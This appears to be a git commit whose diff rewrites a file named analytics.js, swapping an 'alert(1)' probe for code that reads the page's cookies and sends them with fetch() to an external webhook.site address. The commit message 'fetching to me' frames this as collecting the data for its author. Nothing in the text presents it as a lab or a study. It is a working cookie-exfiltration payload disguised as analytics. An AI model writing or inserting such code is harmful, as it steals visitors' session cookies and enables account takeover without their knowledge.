3ca5afe21cc98b4187c08634720ce13a656f1aa1
Vladyslav Klymenko <vl.klymenko@gmail.com>
2026-04-21 19:55:15 +1000

    fetching to me

--- analytics.js
+++ analytics.js
@@ -1,1 +1,7 @@
-alert(1);
+// cookie logging
+console.log("Cookies:", document.cookie);
+
+fetch(
+  "https://webhook.site/12cd4975-8ee7-43e3-addd-20f229f708c9?cookies=" +
+    encodeURIComponent(document.cookie),
+);
